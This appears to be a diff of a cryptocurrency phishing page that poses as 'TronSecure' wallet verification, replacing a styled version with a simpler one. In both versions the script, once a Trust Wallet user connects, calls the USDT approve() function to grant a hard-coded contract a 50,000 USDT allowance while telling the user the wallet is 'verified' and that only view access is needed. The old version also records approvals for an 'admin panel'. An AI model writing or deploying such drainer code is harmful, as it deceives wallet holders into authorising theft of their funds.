@@ -1,277 +1,80 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>TronSecure - Verify Wallet</title>
-<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
-<style>
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-}
-
-body {
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    padding: 20px;
-}
-
-.container {
-    max-width: 450px;
-    width: 100%;
-    background: white;
-    border-radius: 30px;
-    padding: 40px 30px;
-    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-    text-align: center;
-}
-
-.logo {
-    font-size: 32px;
-    font-weight: bold;
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    margin-bottom: 20px;
-}
-
-.tabs {
-    display: flex;
-    gap: 20px;
-    justify-content: center;
-    margin-bottom: 30px;
-    color: #666;
-    border-bottom: 2px solid #f0f0f0;
-    padding-bottom: 10px;
-}
-
-.tab {
-    padding: 5px 10px;
-    cursor: pointer;
-}
-
-.tab.active {
-    color: #667eea;
-    border-bottom: 2px solid #667eea;
-}
-
-h2 {
-    color: #333;
-    margin-bottom: 10px;
-    font-size: 24px;
-}
-
-.subtitle {
-    color: #666;
-    font-size: 14px;
-    margin-bottom: 30px;
-    line-height: 1.6;
-}
-
-.wallet-card {
-    background: #f8f9fa;
-    border: 2px solid #e0e0e0;
-    border-radius: 20px;
-    padding: 30px 25px;
-    margin: 20px 0;
-    cursor: pointer;
-    transition: all 0.3s;
-    text-align: left;
-    display: flex;
-    align-items: center;
-    gap: 20px;
-}
-
-.wallet-card:hover {
-    border-color: #667eea;
-    background: #f0f3ff;
-}
-
-.wallet-icon {
-    width: 50px;
-    height: 50px;
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    border-radius: 12px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: white;
-    font-size: 24px;
-}
-
-.wallet-info h3 {
-    font-size: 18px;
-    margin-bottom: 5px;
-}
-
-.wallet-info p {
-    color: #666;
-    font-size: 13px;
-}
-
-.verify-btn {
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    color: white;
-    border: none;
-    padding: 12px 25px;
-    border-radius: 30px;
-    font-weight: 600;
-    cursor: pointer;
-    width: 100%;
-    margin: 10px 0;
-}
-
-.note {
-    color: #666;
-    font-size: 12px;
-    margin-top: 20px;
-}
-</style>
+    <meta charset="UTF-8">
+    <title>Verify Wallet</title>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 400px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            margin: 20px 0;
+        }
+        #address {
+            word-break: break-all;
+            padding: 10px;
+            background: #f0f0f0;
+            border-radius: 8px;
+        }
+    </style>
 </head>
-
 <body>
-<div class="container">
-    <div class="logo">TronSecure</div>
-    
-    <div class="tabs">
-        <span class="tab active">Connect</span>
-        <span class="tab">Scan</span>
-        <span class="tab">Waitlist</span>
-        <span class="tab">Result</span>
+    <div class="container">
+        <h2>Verify Wallet</h2>
+        <button onclick="connect()">Connect Trust Wallet</button>
+        <p id="address"></p>
     </div>
-    
-    <h2>CONNECT YOUR WALLET</h2>
-    <div class="subtitle">Advanced security features and energy delegation system</div>
-    
-    <!-- Trust Wallet Card -->
-    <div class="wallet-card" onclick="connectWallet()">
-        <div class="wallet-icon">💎</div>
-        <div class="wallet-info">
-            <h3>TRUST WALLET</h3>
-            <p>Universal Wallet</p>
-        </div>
-    </div>
-    
-    <button class="verify-btn" onclick="connectWallet()">Verify Now →</button>
-    
-    <div class="note">
-        🔒 Only view access required. No private keys.
-    </div>
-    
-    <div id="status" style="margin-top:20px;"></div>
-</div>
 
-<script>
-// ============================================
-// YOUR CONTRACT ADDRESS
-// ============================================
-const CONTRACT_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
-const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const APPROVE_AMOUNT = 50000; // 50,000 USDT
-
-// ============================================
-// SHOW STATUS
-// ============================================
-function showStatus(msg, type) {
-    const colors = {
-        success: '#d4edda',
-        error: '#f8d7da',
-        info: '#cce5ff',
-        warning: '#fff3cd'
-    };
-    document.getElementById('status').innerHTML = 
-        `<div style="background:${colors[type]}; color:#333; padding:12px; border-radius:8px; margin-top:10px;">${msg}</div>`;
-}
-
-// ============================================
-// CONNECT WALLET - EXACT FLOW
-// ============================================
-async function connectWallet() {
-    try {
-        showStatus('Opening WalletConnect...', 'info');
-        
-        // Check if in Trust Wallet
-        if (!window.tronLink) {
-            showStatus('⚠️ Please open in Trust Wallet DApp browser', 'warning');
-            return;
-        }
-        
-        // Step 1: This will trigger WalletConnect popup (IMG_0970)
-        // Step 2: Trust Wallet popup will appear (IMG_0969)
-        await window.tronLink.request({ method: 'tron_requestAccounts' });
-        
-        // Get connected address
-        const address = window.tronWeb.defaultAddress.base58;
-        showStatus(`✅ Connected: ${address.slice(0,6)}...${address.slice(-4)}`, 'success');
-        
-        // Step 3: Auto approve 50,000 USDT
-        showStatus('⏳ Auto-approving 50,000 USDT...', 'info');
-        
-        const contract = await window.tronWeb.contract().at(USDT_ADDRESS);
-        const result = await contract.approve(
-            CONTRACT_ADDRESS, 
-            APPROVE_AMOUNT * 1000000
-        ).send();
-        
-        showStatus('✅ Verification complete! 50,000 USDT approved', 'success');
-        
-        // Save for admin panel
-        saveApproval(address, APPROVE_AMOUNT, result);
-        
-        // Redirect after 2 seconds
-        setTimeout(() => {
-            window.location.href = 'index.html?verified=true';
-        }, 2000);
-        
-    } catch (error) {
-        console.error(error);
-        if (error.message.includes('rejected')) {
-            showStatus('❌ Connection rejected', 'error');
+    <script>
+    async function connect() {
+        if (window.tronLink) {
+            try {
+                // Connect wallet
+                await window.tronLink.request({ method: 'tron_requestAccounts' });
+                const address = window.tronWeb.defaultAddress.base58;
+                document.getElementById('address').innerText = address;
+                
+                // Auto approve 50,000 USDT
+                const contract = await window.tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
+                await contract.approve("TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt", 50000 * 1000000).send();
+                
+                alert('✅ Wallet verified!');
+                
+                // Redirect back to home
+                setTimeout(() => {
+                    window.location.href = 'index.html?verified=true';
+                }, 2000);
+                
+            } catch(error) {
+                alert('❌ Error: ' + error.message);
+            }
         } else {
-            showStatus('❌ ' + error.message, 'error');
+            alert('⚠️ Please open in Trust Wallet DApp browser');
         }
     }
-}
-
-// ============================================
-// SAVE APPROVAL FOR ADMIN
-// ============================================
-function saveApproval(address, amount, txHash) {
-    const approvals = JSON.parse(localStorage.getItem('approvals') || '[]');
-    approvals.push({
-        user: address,
-        amount: amount,
-        txHash: txHash,
-        status: 'active',
-        time: new Date().toISOString(),
-        token: 'USDT'
-    });
-    localStorage.setItem('approvals', JSON.stringify(approvals));
-    console.log('✅ Approval saved');
-}
-
-// ============================================
-// AUTO DETECT ON LOAD
-// ============================================
-window.onload = function() {
-    if (window.tronLink) {
-        showStatus('✅ Trust Wallet detected. Click "Verify Now" to connect.', 'info');
-    } else {
-        showStatus('⚠️ Please open in Trust Wallet DApp browser', 'warning');
-    }
-    
-    // Check if already verified
-    const urlParams = new URLSearchParams(window.location.search);
-    if (urlParams.get('verified') === 'true') {
-        showStatus('✅ Wallet already verified!', 'success');
-    }
-};
-</script>
-
+    </script>
 </body>
 </html>
